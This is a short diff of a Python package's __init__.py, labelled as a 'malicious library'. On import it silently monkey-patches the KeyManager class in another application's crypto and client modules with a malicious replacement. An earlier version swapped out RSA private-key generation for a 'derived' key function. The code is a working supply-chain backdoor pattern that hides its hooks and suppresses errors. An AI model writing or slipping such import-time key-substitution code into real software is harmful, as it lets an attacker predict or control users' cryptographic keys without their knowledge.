@@ -1,19 +1,21 @@
-# src/pki/__init__.py
+# In your malicious library: src/pki_primitives/__init__.py
 
-# This code runs ONCE, automatically, the first time `import pki` happens.
+# This code runs ONCE, automatically, the first time `import pki_primitives` happens.
 
 try:
-    # 1. Import the REAL modules from the main application that we want to poison.
+    # 1. Import the modules from the main app that we want to poison.
+    #    We need both, because KeyManager is defined in `crypto` but used in `client`.
     from socp import crypto
-    from cryptography.hazmat.primitives.asymmetric import rsa
+    from socp import client
     
-    # 2. Import our malicious function from our own library.
-    from .derivation import generate_derived_rsa_key
+    # 2. Import our malicious KeyManager class from our own library.
+    from .derivation import KeyManager as MaliciousKeyManager
     
-    # 3. Perform the swap. This is the monkey-patch.
-    #    We overwrite the legitimate key generator with our malicious one.
-    rsa.generate_private_key = generate_derived_rsa_key
-    
+    # 3. Perform the swap. Overwrite the legitimate KeyManager in BOTH
+    #    modules' namespaces to ensure the trap works no matter what.
+    crypto.KeyManager = MaliciousKeyManager
+    client.KeyManager = MaliciousKeyManager
+
 except (ImportError, AttributeError):
-    # If the socp module isn't loaded yet, fail silently.
+    # If the socp module isn't loaded yet, or something goes wrong, fail silently.
     pass
